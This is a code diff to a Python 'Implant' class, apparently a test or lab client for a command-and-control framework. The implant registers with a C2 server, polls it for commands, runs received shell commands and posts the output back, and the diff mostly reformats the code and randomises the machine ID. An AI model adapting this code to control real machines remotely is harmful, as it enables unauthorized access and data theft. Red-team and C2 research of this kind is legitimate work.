@@ -2,6 +2,8 @@ import requests
 import subprocess
 import hashlib
 from urllib.parse import urljoin
+import random
+
 
 class Implant():
     def __init__(self, c2_addr, debug=False, computer_guid=None):
@@ -11,9 +13,9 @@ class Implant():
         else:
             self.computer_guid = self._gen_id()
         self.debug = debug
-    
+
     def _gen_id(self):
-        mac_addr = "00:00:00:00:00:03"
+        mac_addr = f"00:00:00:00:00:{random.randint(0,255):02X}"
         return hashlib.sha256(mac_addr.encode('utf-8')).hexdigest()
 
     def _print_debug_request(self, r):
@@ -24,7 +26,7 @@ class Implant():
             f"[DEBUG] Response Body: {r.content}"
         )
         print(message)
-    
+
     def register(self):
         data = {
             "computer_name": "dummyimplantcomputer",
@@ -65,20 +67,21 @@ class Implant():
             "command_id": command_id,
             "result": result,
         }
-        r = requests.post(urljoin(self.c2_addr, "sendCommandResult"), json=data)
+        r = requests.post(
+            urljoin(self.c2_addr, "sendCommandResult"), json=data)
         if self.debug:
             self._print_debug_request(r)
-    
+
     def get_command_and_run(self):
         command_id, command_type, command = self.get_command()
         if command is None:
             return
-        if command_type=="shell":
+        if command_type == "shell":
             result = self.run_shell(command)
-        elif command_type=="whoami":
+        elif command_type == "whoami":
             result = "i am an implant"
         self.return_command(command_id, result)
-    
+
     def heartbeat(self):
         data = {
             "computer_guid": self.computer_guid,
@@ -87,7 +90,7 @@ class Implant():
         r = requests.post(urljoin(self.c2_addr, "heartbeat"), json=data)
         if self.debug:
             self._print_debug_request(r)
-    
+
     def alert(self, message):
         data = {
             "computer_guid": self.computer_guid,
@@ -98,5 +101,5 @@ class Implant():
             self._print_debug_request(r)
 
 
-if __name__=="__main__":
+if __name__ == "__main__":
     implant = Implant("http://localhost:5000", debug=True)
